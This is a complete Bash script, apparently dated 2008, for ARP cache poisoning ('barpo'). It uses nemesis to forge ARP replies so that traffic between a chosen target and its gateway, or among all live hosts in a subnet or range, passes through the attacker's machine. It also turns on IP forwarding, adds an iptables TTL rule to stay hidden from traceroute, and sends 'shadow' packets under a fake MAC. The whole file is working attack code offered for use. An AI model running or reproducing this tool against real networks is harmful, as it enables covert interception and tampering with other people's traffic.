#!/bin/bash
# Copyright (c) 2008 Davide `Anathema` Barbato <anathema@anche.no>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
# 

VER=2.0

declare -i CNT_SWD_PK=0		# shadow packet counter
declare -i CNT_INJ_PK_T=0	# target injected packet counter
declare -i CNT_INJ_PK_G=0	# gateway injected packet counter
declare -a mod
#mod=( ip_tables iptable_filter ipt_TTL iptable_mangle x_tables )
mod=( ip_tables iptable_filter iptable_mangle x_tables )

declare -a bin
bin=( rm wget echo ifconfig lsmod nemesis ping iptables arp modprobe awk grep )

declare -a path
path=( /lib/modules/`uname -r`/kernel/net/ipv4/netfilter/ /lib/modules/`uname -r`/kernel/net/netfilter/ )

declare -a IPALIVE
declare -a HOSTMAC

IFACE=eth0 # default interface #
TIMING=10  # default timing in secs #
VERBOSE=0  # verbose flag #
MYFAKEMAC=00:0a:e6:61:21:8d
NETALL=0   # to set the whole network poisoning
NETRANGE=0 # to set the range poisoning	
NOSHADOW=0 # no shadow packet injection (-n)
URL="http://www.studenti.unina.it/~dav.barbato"

# setting routing callback for ctrl-c
trap 'display_stats' 2

function usage() {
	echo -e "USAGE:\n`basename $0` -h target -g gateway [-n] [-i interface] [-t timing] [-v] [-u] "
	echo "-h target      = target to sniff"
	echo "-g gateway     = gateway to poison"
	echo "[-n]	       = no shadow injection" 
	echo "[-i interface] = interface to use (default: eth0)"
	echo "[-t timing]    = timing value in secs (default: 10s)"
	echo "[-v]	       = verbose"
	echo "[-u]	       = update this script"
	exit 1
}

function banner() {
	echo -e "\n..::[Bash ARP cache poisoning script $VER]::.."
	echo -e "..::[coded by Davide \`Anathema\` Barbato]::..\n\n"
}

function vecho() {
	if [ "${VERBOSE}" == "1" ]; then
		echo $1 $2
	fi
}

function eecho() {
	local escape
	if [ "$#" -gt 1 ]; then
		escape=${2:0:2}
		param=${2/\\n/}
		if [[ ! "$escape" =~ "\n" ]] && [[ ! "$escape" =~ "\t" ]]; then
			escape=""
		fi
		echo $1 "${escape}[x] Error: $param"
	else
		echo "[x] Error: $1"
	fi
}

# check the IP inputs #
function check_ip() {
	local ret=0
	local testx
 	testx=$(echo "${1}." | grep -E "([0-9]{1,3}\.){3}")

	if [ "${testx}" ]; then
  		ret=$(awk -F. '{
      				if ( (($1>=1) && ($1<=254)) &&
           				(($2>=0) && ($2<=255)) &&
           				(($3>=0) && ($3<=255)) ) {
						if ( $4 ~ /-/ ) print 3;
						else if (($4 >= 1) && ($4<=254)) print 0;
				       		else if ($4 == 0) print 2; 
						else print 1;
				} else print 1;
     			}' <<< ${1})
 	else
  		ret=1
 	fi

	if [ "${ret}" -eq 3 ]; then
		ret=$(cut -d '.' -f 4 <<< ${1} | awk -F - '{ 
						if ( $1 == $2 ) print 5;
						else if ( (($1>=1) && ($1<=254)) &&
					   	  	  (($2>=1) && ($2<=254)) ) print 4;
						else print 5;
						}')
	fi	

	# ret values: 
	# 0 - single valid ip
	# 1 - invalid ip
	# 2 - whole network poisoning
	# 3 - possibly ip range (never get back)
	# 4 - valid range ip
        # 5 - same range	
	return ${ret}		
}

# check for modules #
function check_mod() {
	declare -i cnt_fail
	
	for module in ${mod[@]}; do
		cnt_fail=0
		for pathz in ${path[@]}; do
    			vecho -en "\nChecking ${pathz}${module}.ko"
   			
			if [ -f ${pathz}${module}.ko ]; then
				break
   			else
				cnt_fail=cnt_fail+1
   			fi
		done

		#if we didn't find $module in $path[], then it isn't compiled
		if [ "${cnt_fail}" -eq "${#path[@]}" ]; then
			if [ "${VERBOSE}" == "0" ]; then
    				eecho -e "\n${module}.ko not found!"
   			else
    				eecho -e "\n${module}.ko not found in ${path[@]}"
			fi
    			echo "[!] Please recompile your kernel"
			return 1
   		fi
 	done # end modules loop

  	vecho -en "\nChecking /proc/sys/net/ipv4/ip_forward"
	if [ ! -f /proc/sys/net/ipv4/ip_forward ]; then
		if [ "${VERBOSE}" -eq "1" ]; then
   			echo "..not found!"
		else
			eecho -e "\n/proc/sys/net/ipv4/ip_forward not found!"
		fi
		return 1
	else
		vecho "...OK"
  	fi
 	# to a nice output #
  	vecho
 	return 0
}

# check binaries
function check_bin() {
 	local str
	
	if test -x /usr/bin/which; then
  		WHICH="/usr/bin/which"
 	else
  		eecho -e "\nwhich not found! please install it to continue!"
		return 1
 	fi

	for binz in ${bin[@]}; do
   		vecho -ne "\nChecking ${binz}"
  		str=$( ${WHICH} ${binz} 2>/dev/null )
		if [ ! "${str}" ]; then
			if [ "${VERBOSE}" -eq "1" ]; then
   				echo "...not found!"
			else
				eecho -e "\n${binz} not found!"
			fi
   
    			vecho " Searching path is ${PATH}"
			echo "[!] Install ${binz} to continue"
			return 1
		fi
	done
	# to a nice output #
  	vecho
 	return 0
}


# load modules #
function mod_probe() {
	local ret=0
	
	for module in ${mod[@]}; do
   		vecho "Modprobing ${module}"
		mprobe=$(lsmod | grep ${module})

		if [ "${mprobe}" ]; then
			vecho "${module} already mounted...skipping"
			continue
		fi
		if [  "${VERBOSE}" == "1" ]; then
			modprobe ${module}
		else
			modprobe ${module} &> /dev/null
		fi
		if [ "$?" -eq 1 ]; then
   			ret=1
  		fi
 	done
 	return ${ret}
}


function rearp() {
	vecho "Deleting ${1} ARP entry"
	arp -d ${1} &> /dev/null
	
	ping -c 1 ${1} &>/dev/null
	if [ "$?" -eq 1 ]; then
		eecho "${1} seems down!"
		exit 1
	fi
}

# get mac
function get_mac() {
	local mac

  	mac=$( arp -an | grep -w "${1}" | awk -F ' ' '{print $4}' )
	if [ ! "${mac}" ]; then
   		eecho "${1} ARP entry not found!"
		echo 1
  	fi
	echo ${mac}
}

function find_host() {
	local ipnet=$(awk -F . '{print $1"."$2"."$3}' <<< ${TARGET})
	echo "..::[ Looking for host alive ]::.."
	for i in `seq $1 $2`; do
		if [ "${ipnet}.$i" != "${MYIP}" ]; then
			if [ ! "${GATEWAY}" ] || [[ "${GATEWAY}" && "${GATEWAY}" != "${ipnet}.${i}" ]]; then
				vecho "Checking $ipnet.$i..."
				ping -c 1 ${ipnet}.$i &>/dev/null
				if [ "$?" -eq 0 ]; then
					IPALIVE[${#IPALIVE[*]}]="$ipnet.$i"
					echo "$ipnet.$i is ALIVE"
				fi
			fi
		fi
	done
}

function shadow_poisoning() {
	local target=$1
	local tmac=$2

	# shadow me from target arp cache #
	nemesis arp -r -d ${IFACE} -D ${target} -S ${MYIP} -h ${MYFAKEMAC} -m ${tmac} -H ${MYMAC} -M ${tmac} > /dev/null
	if [ "$?" -eq 1 ]; then
 		eecho "Cannot inject ARP packet to ${target} to shadow your IP (${MYIP})"
 		return 1
	fi
	CNT_SWD_PK+=1
 	echo -e ".:[${CNT_SWD_PK}]:. INJECTED shadow packet to target ${target}\n"
	return 0
}

function single_poisoning() {
	local target=$1
	local tmac=$2
	local fakesrc=$3

	# target poisoning #
	nemesis arp -r -d ${IFACE} -D ${target} -S ${fakesrc} -h ${MYMAC} -m ${tmac} -H ${MYMAC} -M ${tmac} > /dev/null
	if [ "$?" -eq 1 ]; then
 		eecho "Cannot inject ARP packet to ${target} with source ${fakesrc}"
		return 1
	fi

	CNT_INJ_PK_T+=1
	if [ "${VERBOSE}" -eq 1 ]; then
  		echo "[${CNT_INJ_PK_T}] Injected packet!"
  		echo "to ${target}"
  		echo "from ${fakesrc}"
  		echo "${target} ARP Cache:"
  		echo "${fakesrc} at ${MYMAC}"
 	else
  		echo "[${CNT_INJ_PK_T}] INJECTED packet to ${target} with source ${fakesrc}"
 	fi

	# fancy! #
	echo
	return 0
}

function get_hosts_mac() {
	for i in "${IPALIVE[@]}"; do
		HOSTMAC[${#HOSTMAC[@]}]=$(get_mac ${i})
		if [ "${HOSTMAC[${index}]}" == "1" ]; then
			eecho "Cannot get ${i} MAC address!"
			return 1
		fi	
	done
	return 0
}

function multiple_poisoning() {
	# we have an net IP. To see how to poison them we need to know
	# if there is a gateway
	declare -i index=0
	declare -i otheridx=0
	local retval

	if [ "${GATEWAY}" ]; then
		for host in "${IPALIVE[@]}"; do
			if [ "${NOSHADOW}" -eq 0 ]; then
				shadow_poisoning ${host} ${HOSTMAC[${index}]}
				retval=$?
				if [ "${retval}" -eq 1 ]; then
					return 1
				fi
			fi

			# poison the target
			single_poisoning ${host} ${HOSTMAC[${index}]} ${GATEWAY}
			retval=$?
			if [ "${retval}" -eq 1 ]; then
				return 1
			fi

			# poison the gateway
			single_poisoning ${GATEWAY} ${GMAC} ${host}
			retval=$?
			if [ "${retval}" -eq 1 ]; then
				return 1
			fi

			index=index+1
		done
	else
		for host in "${IPALIVE[@]}"; do
			if [ "${NOSHADOW}" -eq 0 ]; then
				shadow_poisoning ${host} ${HOSTMAC[${index}]}
				retval=$?
				if [ "${retval}" -eq 1 ]; then
					return 1
				fi
			fi
			otheridx=0
			# we need to set IP host with our MAC to ALL the other (hosts)
			for other in "${IPALIVE[@]}"; do
				if [ "${host}" != "${other}" ]; then
					if [ "${NOSHADOW}" -eq 0 ]; then
						shadow_poisoning ${other} ${HOSTMAC[${otheridx}]}
						retval=$?
						if [ "${retval}" -eq 1 ]; then
							return 1
						fi
					fi
					
					single_poisoning ${other} ${HOSTMAC[${otheridx}]} ${host}
					retval=$?
					if [ "${retval}" -eq 1 ]; then
						return 1
					fi
				fi
				otheridx=otheridx+1
			done
			index=index+1
		done
	fi
	return 0
}


function update() {
	new_version=$(wget -q -O - "${URL}/barpo-version") 
	if [ "$new_version" == "" ]; then
		eecho "Cannot download barpo versioning! "
		exit 1
	fi

	if [ "${VER}" == "$new_version" ]; then
		echo "Your barpo is the latest version"
		exit 0
	fi
	echo "Your barpo needs update..."
	wget -q "${URL}/barpo$new_version.tar.gz" 
	ret=$?
	if [ "$ret" -ne 0 ]; then
		eecho "Cannot download barpo update!"
		exit 1
	fi
	echo "Downloaded barpo$new_version.tar.gz into `pwd`"
	exit 0
}

function display_stats() {
	echo -e "\n..::[Showing stats]::.."
	echo "Shadowed injected packets: ${CNT_SWD_PK}"
	declare -i CNT_INJ_PK_TOT=${CNT_INJ_PK_T}+${CNT_INJ_PK_G}
	echo "Injected packets: ${CNT_INJ_PK_TOT}"
	vecho "Target injected packets: ${CNT_INJ_PK_T}"
	vecho "Gateway injected packets: ${CNT_INJ_PK_G}"
	echo "Quitting..."
	exit 0
}


#### MAIN STARTS HERE! #####

banner

while getopts "unvth:g:i:" argv
do
	case "${argv}" in
   		h) TARGET="$OPTARG";;
   		g) GATEWAY="$OPTARG";;
   		i) IFACE="$OPTARG";;
   		t) TIMING="$OPTARG";;
		n) NOSHADOW=1;;
   		v) VERBOSE=1;;
   		u) UPDATE=1;;
   		*) usage;;
 	esac
done


if [ "${UPDATE}" ]; then
	update
fi

# the target is the only necessary argument
if [ ! "${TARGET}" ]; then
	usage
fi

if [ "${UID}" -ne 0 ]; then
	eecho "You must be root"
 	exit 1
fi

# thanks to snowpunk that find a bug about this line position #
MYIP=$( ifconfig ${IFACE} | grep "inet addr" | awk -F ' ' '{print $2}' | cut -d ':' -f2 )
if [ ! "${MYIP}" ]; then
	# thanks to stemmax to find this "language" bug :D #
	MYIP=$( ifconfig ${IFACE} | grep "indirizzo inet:" | awk -F ' ' '{print $2}' | cut -d ':' -f2 )
	if [ ! "${MYIP}" ]; then
		eecho "Couldn't get ${IFACE} IP"
		exit 1
	fi
fi
MYMAC=$( ifconfig ${IFACE} | grep HWaddr | awk -F ' ' '{print $5}')
if [ ! "${MYMAC}" ]; then
	eecho "Couldn't get ${IFACE} MAC"
	exit 1
fi
vecho "${IFACE} IP: ${MYIP} - MAC: ${MYMAC}"

###### START input IPs check ######
# the arguments configuration can be:
# TARGET	GATEWAY
# Single IP	YES
# Range IP	YES/NO
# Net IP	YES/NO

check_ip ${TARGET}
retval=$?
if [ "$retval" -eq 1 ]; then
	eecho "${TARGET} is not a valid IP address!"
 	exit 1
elif [ "$retval" -eq 2 ]; then
	NETALL=1
elif [ "$retval" -eq 4 ]; then
	NETRANGE=1
elif [ "$retval" -eq 5 ]; then
	eecho "${TARGET} has an invalid range!"
 	exit 1
else
	if [ ! "${GATEWAY}" ]; then
		eecho "You need to specify a gateway!"
		exit 1
	fi
fi


if [ "${GATEWAY}" ]; then
	check_ip ${GATEWAY}
	retval=$?
	if [ "$retval" -eq 1 ]; then
		eecho "${GATEWAY} is not a valid IP address!"
		exit 1
	elif [ "$retval" -gt 1 ]; then
		eecho "${GATEWAY} can only be a single IP address"
		exit 1
	fi
fi
###### END input IPs check ######

###### START check needed stuff ######
echo -n "Checking bin..."
check_bin
if [ "$?" -eq 1 ]; then
	exit 1
fi
echo "All OK!"
vecho

echo -n "Checking modules..."
check_mod
retval=$?
if [ "$retval" -eq 1 ]; then
	exit -1
fi
echo "All OK!"

vecho

echo -n "Modprobing modules..."
mod_probe
if [ "$?" -eq 1 ]; then
	exit -1
fi
echo "All OK!"
###### END check needed stuff ######

vecho

###### START IPs setup data ######
if [ "${NETALL}" -eq 1 ]; then
	find_host 1 254
elif [ "${NETRANGE}" -eq 1 ]; then
	range=$(cut -d '.' -f 4 <<< ${TARGET})
	
	start=$(cut -d '-' -f 1 <<< ${range})
	end=$(cut -d '-' -f 2 <<< ${range})
	
	find_host $start $end
fi

if [ "${NETALL}" -eq 1 ] || [ "${NETRANGE}" -eq 1 ]; then
	if [ "${#IPALIVE[@]}" -eq "0" ]; then
		eecho "No host alive found!"
		exit 1
	fi
	echo "IP added to poison list: ${IPALIVE[@]}"
fi

if [ "${GATEWAY}" ]; then
	# get new $GATEWAY arp entry
	rearp ${GATEWAY}
	GMAC=$(get_mac ${GATEWAY})
	if [ "${GMAC}" == "1" ]; then
		exit 1
	fi
fi

if [ "${NETALL}" -eq 0 ] && [  "${NETRANGE}" -eq 0 ]; then
	# get new $TARGET arp entry
	rearp ${TARGET}
	TMAC=$(get_mac ${TARGET})
	if [ "${TMAC}" == "1" ]; then
		exit 1
	fi
else
	get_hosts_mac
	if [ "$?" -eq 1 ];then
		exit 1
	fi
fi
###### END IPs setup data ######

# enabling forwarding
echo "1" > /proc/sys/net/ipv4/ip_forward

vecho -e "\nSetting iptables rule to traceroute shadow"

# set iptables rule #
iptables -t mangle -A PREROUTING -i ${IFACE} -j TTL --ttl-inc 1

###### START core poisoning loop ######
echo -e "\n..::[Starting poisoning]::..\n"
while true; do
	if [ "${NETALL}" -eq 0 ] && [ "${NETRANGE}" -eq 0 ]; then
		if [ "${NOSHADOW}" -eq 0 ]; then
			shadow_poisoning ${TARGET} ${TMAC}
			retval=$?
			if [ "${retval}" -eq 1 ]; then
				exit 1
			fi
		fi
		single_poisoning ${TARGET} ${TMAC} ${GATEWAY}
		retval=$?
		if [ "${retval}" -eq 1 ]; then
			exit 1
		fi
		single_poisoning ${GATEWAY} ${GMAC} ${TARGET}
		retval=$?
		if [ "${retval}" -eq 1 ]; then
			exit 1
		fi
	else
		multiple_poisoning
		retval=$?
		if [ "${retval}" -eq 1 ]; then
			exit 1
		fi
	fi
	sleep ${TIMING}
done
###### END core poisoning loop ######
